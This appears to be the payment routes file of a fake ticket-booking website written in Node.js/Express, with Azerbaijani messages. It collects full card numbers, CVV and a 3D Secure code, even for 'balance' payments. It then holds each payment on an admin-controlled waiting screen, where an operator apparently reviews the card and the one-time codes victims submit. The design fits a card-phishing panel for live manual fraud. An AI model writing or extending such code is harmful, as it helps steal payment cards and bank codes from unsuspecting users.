// src/routes/booking.js - Ödəniş bölümü (tam FİXLƏNMİŞ)

const express = require('express');
const { Order, Ticket, Trip, Payment } = require('../models/index');
const { requireAuth } = require('../middleware/auth');
const bookingService = require('../services/bookingService');
const paymentService = require('../services/paymentService');
const { generateTicketPdf } = require('../services/ticketPdfService');
const config = require('../config');
const h = require('../utils/helpers');

const router = express.Router();

const CARD_FIELDS = ['number', 'holder', 'expiry', 'cvv'];

// ==================== KART VALIDASIYASI ====================
function validateCardInput(card) {
  if (!card) return 'Kart məlumatları daxil edilməyib';
  if (!h.luhnValid(card.number)) return 'Kart nömrəsi yanlışdır';
  if (!String(card.holder || '').trim()) return 'Kart sahibinin adı daxil edilməyib';

  const parts = String(card.expiry || '').split('/');
  if (parts.length !== 2 || !h.expiryValid(parts[0], parts[1])) return 'Kartın bitmə tarixi yanlışdır';
  if (!/^\d{3,4}$/.test(String(card.cvv || '').trim())) return 'CVV yanlışdır';
  return null;
}

// ✅ 3D KOD VALIDASIYASI (RESTORED)
function validateCode(code) {
  if (!code) return '3D Secure kodu daxil edilməyib';
  const digits = String(code || '').replace(/\D/g, '');
  if (digits.length < 4) return '3D Secure kodu 4+ rəqəm olmalıdır';
  if (digits.length > 6) return '3D Secure kodu 6 rəqəmdən çox olmamalıdır';
  return null;
}

// ==================== REZERVASIYA ====================
router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }

    const trip = await Trip.findById(order.trip).lean();

    res.render('pages/payment', {
      title: res.locals.t('search.payTitle'),
      order,
      trip,
      balance: req.currentUser.balance || 0
    });
  } catch (e) {
    next(e);
  }
});

// ==================== ÖDƏNIŞ BAŞLAT (KART) ====================
router.post('/api/payment/card/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    // ✅ Kart validasiyası
    const cardErr = validateCardInput(b.card);
    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });

    // ✅ 3D KOD VALIDASIYASI (RESTORED)
    const codeErr = validateCode(b.card.code3d);
    if (codeErr) return res.status(400).json({ ok: false, message: codeErr });

    // ✅ 3D kodu ilə ödəniş yaradılır
    const payment = await paymentService.initPayment(order, b.card, 'card', b.card.code3d);

    return res.json({
      ok: true,
      message: 'Kart məlumatları qeydə alındı. Ödəniş gözləmə ekranına yönləndirilirsiz...',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

// ==================== ÖDƏNIŞ BAŞLAT (BALANS) ====================
router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    // ✅ Kart validasiyası
    const cardErr = validateCardInput(b.card);
    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });

    // ✅ 3D KOD VALIDASIYASI (RESTORED)
    const codeErr = validateCode(b.card.code3d);
    if (codeErr) return res.status(400).json({ ok: false, message: codeErr });

    if ((req.currentUser.balance || 0) < order.total) {
      return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
    }

    // ✅ 3D kodu ilə ödəniş yaradılır
    const payment = await paymentService.initPayment(order, b.card, 'balance', b.card.code3d);

    return res.json({
      ok: true,
      message: 'Balans ödənişi gözləmə ekranına göndərildi.',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

// ==================== ÖDƏNIŞ GÖZLƏMƏ (Admin Təsdiq) ====================
router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }

    // payment-waiting səhifəsinə yönləndər
    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    const stage = payment ? payment.stage : 'card_review';

    res.render('pages/payment-waiting', {
      title: res.locals.t('payment.title'),
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      stage,
      stageSeconds: paymentService.STAGE_SECONDS,
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 120,
      declined: order.status === 'rejected'
    });
  } catch (e) {
    next(e);
  }
});

// ==================== OTP GİRİŞİ ====================
router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }
    if (['awaiting_verification', 'code_submitted'].indexOf(order.status) === -1) {
      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
    }

    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    const stage = payment ? payment.stage : 'otp_entry';

    res.render('pages/secure3d', {
      title: res.locals.t('secure3d.title'),
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      stage,
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
      stageSeconds: paymentService.STAGE_SECONDS,
      codeSubmitted: stage === 'otp_review' || order.status === 'code_submitted'
    });
  } catch (e) {
    next(e);
  }
});

// ==================== OTP GÖNDƏRİŞİ ====================
router.post('/api/payment/verify', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id }).select('_id').lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });

    const result = await paymentService.submitVerificationCode({ orderId: b.orderId }, b.code, { ip: req.ip });
    return res.json({
      ok: true,
      message: 'OTP göndərildi. Yekun təsdiq gözlənilir.',
      matched: result.matched
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'OTP göndərilə bilmədi' });
  }
});

// ==================== ÖDƏNIŞ STATUSU ====================
router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    const stage = payment ? payment.stage : 'card_review';

    let redirect = null;
    if (order.status === 'confirmed') redirect = '/' + res.locals.locale + '/ugur/' + order._id;
    else if (stage === 'otp_entry') redirect = '/' + res.locals.locale + '/3d-tesdiq/' + order._id;
    else if (order.status === 'rejected') redirect = '/' + res.locals.locale + '/odenis-gozleme/' + order._id;

    res.json({
      ok: true,
      status: order.status,
      stage,
      wrongCode: stage === 'wrong_code',
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
      stageSeconds: paymentService.STAGE_SECONDS,
      redirect,
      message: order.adminNote || ''
    });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
  }
});

// ==================== TİKET YÜKLƏMƏ ====================
router.get('/bilet/:ticketId/yukle', async (req, res, next) => {
  try {
    const ticket = await Ticket.findById(req.params.ticketId).lean();
    if (!ticket) return next();
    const user = req.currentUser;
    if (!user || String(ticket.user) !== String(user._id)) return res.status(403).send('Giriş rədd edildi');

    const pdf = await generateTicketPdf(ticket);
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="bilet-${ticket.ticketNumber}.pdf"`);
    res.send(pdf);
  } catch (e) {
    next(e);
  }
});

module.exports = router;
